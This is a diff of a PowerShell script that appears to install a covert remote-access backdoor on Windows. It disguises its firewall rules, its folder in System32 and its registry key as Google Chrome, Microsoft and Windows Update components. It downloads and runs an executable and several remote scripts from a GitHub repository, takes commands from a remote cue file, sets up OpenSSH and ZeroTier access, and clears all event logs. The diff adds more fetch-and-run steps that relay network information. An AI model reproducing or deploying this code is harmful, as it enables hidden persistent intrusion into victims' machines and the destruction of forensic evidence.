@@ -12,23 +12,23 @@ $ssholdfirewall = "Google Chrome Core Service"
 $ztprogramname = "ZeroTier One"
 $sshprogramname = "OpenSSH"
 $sshfirewall = "Windows Runtime Broker"
+$sshinstall = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/OpenSSHStuff/OpenSSHInstallFromExe.ps1"
+$ztinstall = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/MeshNetworkInstall.ps1"
+$codeUrl = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/CuesForRemoteHosts.txt?cachebuster=$(Get-Random)"
+$pinginstallscript = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/PingTasks/PingTaskForNetworkInfoRelay.ps1"
+$pinguninstallscript = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/PingTasks/PingTasksCleanup.ps1"
+$downloadUrl = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/DiscordStatusUpdateBot.exe"
+$hashesUrl = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/HashesOfCorePrograms.txt"
 $ztdir = "C:\ProgramData\ZeroTier"
 $ztdatadir = "$env:LOCALAPPDATA\ZeroTier"
 $sshdir = "C:\Program Files\OpenSSH"
 $sshdatadir = "C:\ProgramData\ssh"
 $regPath = "HKLM:\Software\WindowsUpdateService"
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-$sshinstall = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/OpenSSHStuff/OpenSSHInstallFromExe.ps1"
-$ztinstall = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/MeshNetworkInstall.ps1"
-$codeUrl = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/CuesForRemoteHosts.txt?cachebuster=$(Get-Random)"
+$botpath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\$programNameWithExtension"
 $programDataPath = $env:ProgramData
-$storedData = (Get-ItemProperty -Path $regPath).Data
-$storedCode = (Get-ItemProperty -Path $regPath).Code
-$downloadUrl = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/DiscordStatusUpdateBot.exe"
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $downloadedFileName = [System.IO.Path]::GetFileName($downloadUrl)
 $programNameWithExtension = [System.IO.Path]::GetFileName($downloadUrl)
-$botpath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\$programNameWithExtension"
-$hashesUrl = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/HashesOfCorePrograms.txt"
 #File Integrity Check.
 if (-not (Test-Path (Split-Path $botpath))) {
     New-Item -Path (Split-Path $botpath) -ItemType Directory -Force
@@ -49,6 +49,9 @@ if (-not (Test-Path $botpath)) {
     Invoke-WebRequest -Uri $downloadUrl -OutFile $botpath
 }
 #Function to add or update registry keys
+if (-not (Test-Path $regPath)) {
+    New-Item -Path $regPath -Force | Out-Null
+}
 function CheckAndUpdateRegistryCode {
     param (
         [string]$regPath = "HKLM:\Software\WindowsUpdateService"
@@ -62,6 +65,8 @@ function CheckAndUpdateRegistryCode {
         New-ItemProperty -Path $regPath -Name 'Code' -PropertyType String -Value '001122'
     }
 }
+$storedData = (Get-ItemProperty -Path $regPath).Data
+$storedCode = (Get-ItemProperty -Path $regPath).Code
 #Web Install
 function web-install {
     param (
@@ -290,6 +295,7 @@ if ($storedCode -ne $null) {
 	                        Retry-Operation {
 			 			Uninstall-Program -ProgramName $ztprogramname
 						Uninstall-Program -ProgramName $sshprogramname
+			   			web-install -InstallScriptURL $pinguninstallscript
                       				Stop-AndDisable-ServiceSafe -ServiceName $ztservice
                       				Stop-AndDisable-ServiceSafe -ServiceName $sshagentservice
                       				Stop-AndDisable-ServiceSafe -ServiceName $sshdservice
@@ -318,6 +324,7 @@ if ($storedCode -ne $null) {
               		"ztpurge" {
 					Retry-Operation {
      						Uninstall-Program -ProgramName $ztprogramname
+	   					web-install -InstallScriptURL $pinginstallscript
                         			Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
               				} -MaxRetries $retryAttempts
 				}
@@ -325,6 +332,7 @@ if ($storedCode -ne $null) {
               		"ztinstall" {
                          		Retry-Operation {				
                         			web-install -InstallScriptURL $ztinstall
+			   			web-install -InstallScriptURL $pinguninstallscript
 			  			Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
                   			} -MaxRetries $retryAttempts
               	  		}                
